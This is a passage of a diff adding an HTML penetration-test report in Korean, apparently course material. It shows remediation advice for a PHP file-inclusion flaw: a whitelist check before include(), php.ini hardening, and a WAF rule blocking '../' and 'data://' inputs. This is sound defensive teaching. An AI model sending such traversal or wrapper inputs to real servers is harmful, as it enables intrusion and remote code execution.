+                * <strong>Secure Coding (시큐어 코딩):</strong> 소프트웨어 개발 초기 단계부터 보안 취약점이 발생하지 않도록 코딩 규칙과 방어 기법을 적용하여 안전한 소스 코드를 작성하는 방법론입니다.<br>
+                * <strong>Root Cause Analysis (근본 원인 분석):</strong> 표면적인 증상이 아닌, 문제나 보안 사고를 일으킨 가장 핵심적이고 근원적인 원인을 파악하는 아키텍처 분석 과정입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 10: 아키텍처 기반 대응 및 권고안 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-emerald-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="shield-check" class="w-8 h-8 text-emerald-400"></i> 아키텍처 기반 보안 대응 권고안 (Remediation)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-12">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    인프라스트럭처 보안 관점에서, 이 취약점을 원천 차단하고 엔터프라이즈 자산을 보호하기 위한 <strong>심층 방어(Defense in Depth)</strong> 솔루션을 다음과 같이 권고합니다.
+                </p>
+
+                <div class="space-y-6">
+                    <!-- 권고 1: 코드 레벨 조치 -->
+                    <div class="flex items-start gap-4 bg-slate-800/50 p-6 rounded-2xl border border-emerald-900/50">
+                        <i data-lucide="code" class="w-8 h-8 text-emerald-500 shrink-0 mt-1"></i>
+                        <div>
+                            <h3 class="text-xl font-bold text-slate-100 mb-2">1. 화이트리스트(Whitelist) 기반 입력값 검증</h3>
+                            <p class="text-sm text-slate-300 leading-relaxed mb-3">
+                                웹 서버에 호출될 수 있는 안전한 파일 이름들을 배열(Array) 형태의 화이트리스트로 미리 선언하십시오. 사용자의 입력값이 해당 목록에 정확히 일치할 때만 <code>include</code>를 허용하도록 코드를 재작성해야 합니다.
+                            </p>
+                            <div class="bg-black/60 p-3 rounded font-mono text-xs text-emerald-300 border border-slate-700">
+                                $allowed_pages = array("home.php", "about.php", "contact.php");<br>
+                                if(in_array($_GET['page'], $allowed_pages)) { include($_GET['page']); }
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 권고 2: 서버 환경 경화 -->
+                    <div class="flex items-start gap-4 bg-slate-800/50 p-6 rounded-2xl border border-emerald-900/50">
+                        <i data-lucide="settings" class="w-8 h-8 text-emerald-500 shrink-0 mt-1"></i>
+                        <div>
+                            <h3 class="text-xl font-bold text-slate-100 mb-2">2. 서버 환경 설정 경화 (Hardening)</h3>
+                            <p class="text-sm text-slate-300 leading-relaxed">
+                                PHP 웹 서버의 <code>php.ini</code> 설정에서 원격 코드 실행의 매개체가 되는 기능들을 완전히 차단하십시오. <code>allow_url_include = Off</code> 및 <code>allow_url_fopen = Off</code> 로 변경한 뒤 웹 데몬을 재시작해야 합니다.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- 권고 3: WAF 구축 및 경고 -->
+                    <div class="flex items-start gap-4 bg-slate-800/50 p-6 rounded-2xl border border-yellow-900/50 relative overflow-hidden">
+                        <div class="absolute top-0 right-0 bg-yellow-600 text-white text-[10px] font-black px-4 py-1.5 rounded-bl-lg uppercase tracking-widest">Cost Alert</div>
+                        <i data-lucide="shield" class="w-8 h-8 text-yellow-500 shrink-0 mt-1"></i>
+                        <div>
+                            <h3 class="text-xl font-bold text-slate-100 mb-2">3. 웹 애플리케이션 방화벽 (WAF) 전진 배치</h3>
+                            <p class="text-sm text-slate-300 leading-relaxed block">
+                                코드 수정과 별개로 네트워크 앞단에 <strong>WAF(Web Application Firewall)</strong>를 도입하여 <code>../</code> 경로나 <code>data://</code> 래퍼가 포함된 악성 HTTP 요청을 L7 계층에서 실시간 차단하는 룰셋(Ruleset)을 활성화하십시오.
+                            </p>
+                            <div class="mt-4 p-4 bg-red-900/20 border-l-4 border-red-500 rounded text-sm text-red-200 leading-relaxed">
+                                <i data-lucide="alert-circle" class="inline w-4 h-4 mr-1"></i> <strong>클라우드 환경 비용(Cost) 주의사항:</strong> AWS 환경에서 <strong>AWS WAF</strong>를 도입할 경우, 기본 웹 ACL 생성 비용(월 $5) 외에 적용하는 보안 규칙(Rule)의 개수(개당 $1)와 처리되는 트래픽 요청 건수(100만 건당 $0.60)에 비례하여 <strong>유료 과금이 지속적으로 발생</strong>합니다. 트래픽이 많은 엔터프라이즈 환경에서는 사전에 철저한 클라우드 예산 산정(Cost Estimation)이 필수적입니다.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Defense in Depth (심층 방어):</strong> 성벽을 여러 겹 쌓는 것처럼 네트워크, 서버, 애플리케이션 등 여러 계층에 독립적인 보안 장치를 겹겹이 배치하여 한 계층이 뚫리더라도 다음 계층에서 공격을 차단하는 다층 보안 설계 철학입니다.<br>
+                * <strong>Hardening (경화):</strong> 시스템, 서버, 또는 소프트웨어의 취약한 기본 설정을 수정하고 불필요한 서비스를 제거하여 사이버 공격에 대한 저항력을 극대화하는 보안 강화 작업입니다.
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 System Architect Pro. All rights reserved.
+        </div>
+        <p class="text-slate-600 text-xs leading-relaxed max-w-3xl mx-auto italic block">
+            본 보고서는 IP 직업훈련 전문가과정 교육용 목적으로 작성된 모의 해킹 결과 증빙 자료입니다. 기업의 인프라스트럭처 보안을 설계하고 방어 전략을 수립하기 위한 지침으로 사용되어야 하며, 불법적인 타겟에 대한 도용을 엄격히 금지합니다.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
